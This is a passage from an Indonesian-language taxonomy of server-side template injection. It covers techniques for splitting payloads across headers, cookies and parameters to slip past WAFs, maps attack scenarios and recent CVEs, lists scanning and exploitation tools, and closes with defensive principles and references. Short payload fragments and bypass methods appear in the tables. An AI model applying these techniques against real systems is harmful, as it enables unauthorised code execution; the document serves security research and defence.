| **HTTP header smuggling** | Deliver bagian payload via HTTP header, akses via `request.headers` | `request\|attr(request.headers.x)` dengan header `X: __class__` |
| **Cookie-based delivery** | Simpan komponen payload dalam cookie, akses via `request.cookies` | `request\|attr(request.cookies.x)` |
| **Multi-parameter split** | Pecah payload di seluruh multiple GET/POST parameter, reassemble dalam template | Setiap `request.args.paramN` membawa fragment |
| **Content-Type confusion** | Gunakan Content-Type yang tidak terduga untuk melewati WAF body parsing | JSON body dengan template syntax ketika WAF mengharapkan form data |
| **Path-based injection** | Inject via URL path segment, akses via `request.path` | Template injection dalam routing parameter |

---

## Attack Scenario Mapping (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama | Dampak |
|---|---|---|---|
| **Unsandboxed RCE** | Template engine tanpa pembatasan, input pengguna dalam template source | §1 (Direct Execution) | Full system compromise |
| **Sandboxed RCE** | Template engine dengan sandbox, memerlukan escape chain | §4 (Sandbox Escape) + §2 (Introspection) | Full system compromise |
| **CMS Template Editing** | CMS mengizinkan user mengedit template (Grav, Craft, WordPress) | §3 (Built-in Abuse) + §4 (Sandbox Escape) | Site takeover, lateral movement |
| **Filtered/WAF-Protected** | Input filter atau WAF memblokir payload umum | §8 (Bypass Techniques) + §2/§3 | RCE jika bypass berhasil |
| **Prototype Pollution → SSTI** | Kerentanan SSPP berantai ke template engine | §5 (Compilation Pollution) | RCE via indirect template compromise |
| **Blind SSTI** | Tidak ada output reflection; memerlukan out-of-band exfiltration | §7-2 (Blind Detection) + any §2-§4 | Data exfiltration, RCE via callback |
| **SSRF via Template** | Template engine fetch remote resource atau akses internal API | §4-1 (FreeMarker `getResourceAsStream`), §1-3 | Internal service access, cloud metadata |
| **File Read/Write** | Template menyediakan file I/O primitive atau traversal | §1-3, §4-1 (ClassLoader resource) | Source code disclosure, webshell creation |
| **Client-Side Template Injection (CSTI)** | Client-side framework memproses input pengguna sebagai template dalam browser | AngularJS `{{constructor...}}`, Vue.js `constructor` | XSS, DOM manipulation (bukan RCE) |

---

## CVE / Bounty Mapping (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Produk | Dampak / Bounty |
|---|---|---|---|
| §4-2 (Twig sandbox bypass) + §3-2 (built-in abuse) | CVE-2024-28116 | Grav CMS < 1.7.45 | Authenticated RCE. Modifikasi runtime config untuk whitelist `system()` |
| §4-2 (Twig sandbox regex bypass) | CVE-2025-66294 | Grav CMS < 1.8.0-beta.27 | Authenticated RCE via nested `evaluate_twig()` melewati regex sanitization |
| §3-2 (Twig built-in) + §6-2 (CMS double render) | CVE-2025-32432 | Craft CMS 3.x–5.x | **Unauthenticated RCE (CVSS 10.0)**. ~13,000 instance rentan, ~300 compromised. Metasploit module tersedia |
| §4-1 (FreeMarker sandbox bypass) + §3-1 (`?api`) | CVE-2023-49964 | Alfresco | Authenticated RCE via ClassLoader chain melalui built-in `?api` |
| §4-1 (FreeMarker application utility abuse) | CVE-2024-48962 | Apache OFBiz < 18.12.17 | CSRF + SSTI mengarah ke RCE via `GroovyUtil.eval()` melalui hash FreeMarker `Static` (memerlukan authenticated user interaction) |
| §3-1 (FreeMarker `?new`) | CVE-2016-4462 | Apache OFBiz 13.07.03 | RCE via instantiate class `Execute` |
| §4-3 (Thymeleaf denylist gap) | Reported 2024 | Spring Boot 3.3.4 | RCE via `MethodUtils` (commons-lang3) melewati package denylist Thymeleaf |
| §4-4 (Pebble sandbox bypass) | GHSL-2020-050 | Pebble Templates | RCE via bypass case-sensitivity `getClass()` (< 3.0.9) |
| §5-1 (EJS compilation pollution) | CVE-2022-29078 | EJS | RCE via `opts.settings['view options']` pollution |
| §5-1 (EJS `outputFunctionName`) | CVE-2024-33883 | EJS < 3.1.10 | RCE via prototype pollution → `outputFunctionName` injection |
| §1-1 (Direct PHP execution) | CVE-2024-22722 | Form Tools 3.1.1 | RCE via template injection dalam field Group Name |
| §3-1 (FreeMarker) | CVE-2024-41667 | OpenAM <= 15.0.3 | RCE via FreeMarker template injection |
| §4-2 (Twig sandbox bypass) | CVE-2024-28118 | Grav CMS (Twig) | RCE via unrestricted Twig extension class access |
| §7-1 + §2-1 | Bug Bounty | Undisclosed | Bounty $1,200 untuk SSTI `{{6*200}}` yang mengarah ke RCE |
| §2-1 (Config globals) | HackerOne #423541 | Shopify (Return Magic) | SSTI via Jinja2 dalam third-party integration |
| §6-2 (SaaS Placeholder Injection) | Zendesk Placeholder Injection (Rikesh Baniya, 2024) | Zendesk | User info extraction via menyuntikkan platform template placeholder (misalnya, `{{ticket.requester.email}}`) melalui differential sanitization subject-to-description; system me-render injected placeholder dengan PII victim dalam automated response context |
| Cross-ref: Expression Injection | Unrestricted SOQL Endpoint Exfiltration (Securitum, 2024) | Salesforce | Data exfiltration via unrestricted SOQL query endpoint tanpa parameterized binding; expression-based injection analog dengan SSTI dalam query language Salesforce (lihat `salesforce-lightning-platform-security.md` §2) |

---

## Detection Tools

### Offensive Tools (Scanner & Exploiter)

| Tool | Tipe | Target Scope | Core Technique |
|---|---|---|---|
| **SSTImap** | CLI scanner/exploiter | 15+ engine (Jinja2, Twig, Smarty, Mako, dll.) | Automated detection, identification, dan exploitation dengan interactive mode |
| **Tplmap** | CLI scanner/exploiter | 15+ engine | Automated SSTI detection dan exploitation; predecessor ke SSTImap |
| **TInjA** | CLI scanner | 44 template engine di seluruh 8 bahasa | Polyglot-based detection dan identification menggunakan Hackmanit Template Injection Table |
| **Burp Suite Scanner** | Commercial proxy | Multiple engine | Built-in SSTI detection rule dengan active scanning |
| **Nuclei SSTI Templates** | Template-based scanner | Multiple engine | YAML-based detection template untuk automated scanning |
| **PayloadsAllTheThings** | Payload repository | Semua engine major | Comprehensive payload collection yang diorganisir berdasarkan engine dan bahasa |

### Defensive Tools & Resources

| Tool | Tipe | Target Scope | Core Technique |
|---|---|---|
| **Template Injection Table** | Interactive reference | 44 engine | Polyglot → engine identification mapping (Hackmanit) |
| **Template Injection Playground** | Testing environment | Multiple engine | Docker-based lab untuk testing payload SSTI secara aman |
| **Semgrep SSTI Rules** | Static analysis | Multiple framework | Pattern-based detection dari unsafe template rendering dalam source code |
| **TEFuzz** | Fuzzer (penelitian) | PHP template engine | Menemukan 55 exploitable sandbox bypass dalam 7 PHP engine |
| **AngularJS CSTI Scanner** | CLI scanner | AngularJS 1.x | Automated client-side template injection detection |

### Research Resources

| Resource | Tipe | Cakupan |
|---|---|---|
| **PortSwigger Web Security Academy** | Interactive labs | SSTI detection, identification, exploitation, sandbox escape |
| **HackTricks SSTI** | Reference wiki | Comprehensive engine-specific payload documentation |
| **GoSecure Template Injection Workshop** | Training material | Hands-on workshop mencakup multiple engine |

---

## Summary: Core Principles

### The Fundamental Problem

Server-Side Template Injection ada karena template engine **dirancang untuk Turing-complete** (atau near-complete) — mereka harus mendukung complex logic, iteration, function call, dan object access untuk memenuhi peran mereka dalam web application rendering. Expressiveness inheren ini menciptakan tension yang tidak dapat direkonsiliasi antara template functionality dan security ketika input untrusted memasuki template evaluation pipeline.

Root cause bukan bug dalam engine individual manapun tetapi **category-level design flaw**: conflation dari data dan code dalam template rendering. Ketika input pengguna digabungkan ke dalam template source (daripada di-pass sebagai safe data parameter), template engine tidak dapat membedakan antara logic yang dimaksudkan developer dan directive yang disuntikkan attacker. Ini secara struktural identik dengan SQL injection dan command injection — confusion "data as code" yang sama yang telah mengganggu computing sejak awalnya.

### Why Incremental Fixes Fail

Pendekatan sandbox — denylists, allowlists, method restrictions — telah berulang kali di-bypass di seluruh setiap template engine major (§4). Sejarah menunjukkan pola yang konsisten: (1) sandbox diimplementasikan, (2) researcher menemukan bypass via reflection, ClassLoader access, atau application-specific object graph, (3) bypass di-patch, (4) bypass baru ditemukan menggunakan entry point yang berbeda. Arms race ini berlanjut karena sandbox mencoba membatasi bahasa Turing-complete ke subset "yang aman" — masalah yang secara provably undecidable dalam kasus umum.

Survei 2024 menemukan bahwa **31 dari 34 template engine yang dipelajari mengizinkan atau telah mengizinkan RCE**, dan hanya **10 dari 34 menawarkan bentuk proteksi apa pun**. Bahkan di antara mereka dengan proteksi, penelitian bypass secara konsisten menemukan jalur escape baru, terutama ketika template beroperasi dalam framework yang kaya (Spring, Express, Laravel) yang mengekspos extensive object graph.

### The Structural Solution

Satu-satunya defense yang reliable terhadap SSTI adalah **tidak pernah mengizinkan input untrusted menjadi bagian dari template source code**. Ini berarti:

1. **Parameterized templates**: Pass user data secara eksklusif melalui API data-binding template engine (`render_template(template, data=user_input)`), tidak pernah melalui string concatenation ke dalam template source.
2. **Logic-less templates** (Mustache, Handlebars dalam strict mode): Gunakan template engine yang secara deliberate membatasi expressiveness untuk mencegah code execution — meskipun bahkan ini telah di-bypass via prototype pollution (§5).
3. **Immutable template sources**: Pastikan template di-load hanya dari file yang trusted, developer-controlled — tidak pernah dikonstruksi dari input pengguna saat runtime.
4. **Defense in depth**: Bahkan dengan correct template usage, terapkan output encoding, Content Security Policy, dan principle of least privilege untuk membatasi blast radius jika kerentanan diperkenalkan.

Insight paling penting dari taxonomi ini adalah bahwa **mutation space adalah unbounded** — setiap template engine baru, framework integration, dan library dependency memperkenalkan jalur eksploitasi baru. Strategi defender yang hanya sustainable adalah untuk menghilangkan injection vector sepenuhnya, bukan untuk enumerate dan memblokir individual payload.

---

*Dokumen ini dibuat untuk tujuan defensive security research dan vulnerability understanding.*

---

## References

- Kettle, J. (2015). "Server-Side Template Injection: RCE for the Modern Web App." Black Hat USA 2015. https://portswigger.net/research/server-side-template-injection
- Hackmanit. "Template Injection Table." https://cheatsheet.hackmanit.de/template-injection-table/index.html
- Hackmanit. "TInjA: Template Injection Analyzer." https://github.com/Hackmanit/TInjA
- SwisskyRepo. "PayloadsAllTheThings: Server Side Template Injection." https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Vladko312. "SSTImap: Automatic SSTI Detection Tool." https://github.com/vladko312/SSTImap
- Epinna. "Tplmap: Server-Side Template Injection Detection and Exploitation." https://github.com/epinna/tplmap
- Check Point Research. (2024). "Server-Side Template Injection: Transforming Web Applications from Assets to Liabilities." https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/
- Hildebrand, M. "Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning." Master Thesis, Hackmanit.
- Ackcent. "In-depth Freemarker Template Injection." https://ackcent.com/in-depth-freemarker-template-injection/
- Sartor, S. (2024). "CVE-2024-48962: SSTI with Freemarker Sandbox Bypass Leading to RCE." https://www.sebsrt.xyz/blog/cve-2024-48962-ofbiz-ssti/
- modzero. (2024). "Exploiting SSTI in a Modern Spring Boot Application (3.3.4)." https://modzero.com/en/blog/spring_boot_ssti/
- Munoz, A. & Mirosh, O. (2020). "Room for Escape: Scribbling Outside the Lines of Template Security." Black Hat USA 2020.
- Ethical Hacking UK. (2024). "CVE-2024-28116: Server-Side Template Injection in Grav CMS." https://ethicalhacking.uk/authenticated-server-side-template-injection-with-sandbox-bypass-in-grav-cms/
- YesWeHack. "Server-Side Template Injection Exploitation with RCE Everywhere." https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
- HackTricks. "SSTI (Server Side Template Injection)." https://book.hacktricks.wiki/pentesting-web/ssti-server-side-template-injection/
- Intigriti. "Server-Side Template Injection (SSTI): Advanced Exploitation Guide." https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti
- ArXiv:2405.01118. (2024). "A Survey of the Overlooked Dangers of Template Engines." https://arxiv.org/html/2405.01118v1
- OnSecurity. "Method Confusion In Go SSTIs Lead To File Read And RCE." https://onsecurity.io/article/go-ssti-method-research/
- Securitum. "Server Side Template Injection on the Example of Pebble." https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/
- Mizu. "EJS - Server Side Prototype Pollution Gadgets to RCE." https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce
- GitHub Security Lab. "GHSL-2020-050: Arbitrary Code Execution in Pebble Templates." https://securitylab.github.com/advisories/GHSL-2020-050-pebble/